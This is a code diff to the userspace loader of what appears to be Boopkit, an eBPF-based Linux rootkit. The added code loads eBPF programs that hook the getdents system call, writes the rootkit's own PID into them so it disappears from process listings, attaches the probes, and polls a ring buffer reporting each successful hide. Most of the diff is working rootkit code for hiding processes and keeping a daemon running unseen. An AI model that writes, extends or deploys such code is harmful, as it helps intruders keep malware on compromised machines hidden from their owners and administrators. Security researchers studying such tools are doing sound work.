@@ -124,6 +124,16 @@ static struct env {
   int target_ppid;
 } env;
 
+static int handle_event(void *ctx, void *data, size_t data_sz)
+{
+  const struct event *e = data;
+  if (e->success)
+    printf("Hid PID from program %d (%s)\n", e->pid, e->comm);
+  else
+    printf("Failed to hide PID from program %d (%s)\n", e->pid, e->comm);
+  return 0;
+}
+
 // main
 //
 // The primary program entry point and argument handling
@@ -133,7 +143,7 @@ int main(int argc, char **argv) {
 
   printf("Logs: cat /sys/kernel/tracing/trace_pipe\n");
   // Return value for eBPF loading
-  int loaded;
+  int loaded, err;
 
   // ===========================================================================
   // Safe probes
@@ -144,6 +154,13 @@ int main(int argc, char **argv) {
   char sfpath[PATH_MAX] = PROBE_SAFE;
   printf("  -> Loading eBPF Probe: %s\n", sfpath);
   sfobj = pr0be_safe__open();
+  char pid[MAXPIDLEN];
+  env.pid_to_hide = getpid();
+  sprintf(pid, "%d", env.pid_to_hide);
+  printf("  -> Obfuscating PID: %s\n", pid);
+  strncpy(sfobj->rodata->pid_to_hide, pid, sizeof(sfobj->rodata->pid_to_hide));
+  sfobj->rodata->pid_to_hide_len = strlen(pid)+1;
+  sfobj->rodata->target_ppid = env.target_ppid;
   loaded = pr0be_safe__load(sfobj);
   if (loaded < 0) {
     printf("Unable to load eBPF object: %s\n", sfpath);
@@ -153,18 +170,46 @@ int main(int argc, char **argv) {
   }
   printf("  -> eBPF Probe loaded: %s\n", sfpath);
 
+  // Program 1
+  int index = PROG_01;
+  int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
+  int ret = bpf_map_update_elem(
+      bpf_map__fd(sfobj->maps.map_prog_array),
+      &index,
+      &prog_fd,
+      BPF_ANY);
+  if (ret == -1) {
+    printf("Failed to hide PID: %s\n", strerror(errno));
+    return 1;
+  }
 
-  char pid[MAXPIDLEN];
-  env.pid_to_hide = getpid();
-  sprintf(pid, "%d", env.pid_to_hide);
-  strncpy(sfobj->rodata->pid_to_hide, pid, sizeof(sfobj->rodata->pid_to_hide));
-  sfobj->rodata->pid_to_hide_len = strlen(pid)+1;
-  sfobj->rodata->target_ppid = env.target_ppid;
+  // Program 2
+  index = PROG_02;
+  prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_patch);
+  ret = bpf_map_update_elem(
+      bpf_map__fd(sfobj->maps.map_prog_array),
+      &index,
+      &prog_fd,
+      BPF_ANY);
+  if (ret == -1) {
+    printf("Failed to hide PID: %s\n", strerror(errno));
+    return 1;
+  }
 
+  // Attach to probe
+  err = pr0be_safe__attach( sfobj);
+  if (err) {
+    fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
+    return 1;
+  }
 
-
-  // TODO manage safe probe userspace
-
+  // Set up ring buffer
+  struct ring_buffer *rb = NULL;
+  rb = ring_buffer__new(bpf_map__fd( sfobj->maps.rb), handle_event, NULL, NULL);
+  if (!rb) {
+    fprintf(stderr, "Failed to create ring buffer\n");
+    return 1;
+  }
 
   // ===========================================================================
   // Boop probes
@@ -223,6 +268,9 @@ int main(int argc, char **argv) {
   // Boopkit will run as a persistent daemon in userspace!
   int ignore = 0;
   while (1) {
+
+    err = ring_buffer__poll(rb, 100);
+
     // =========================================================================
     // Boop map management
     //
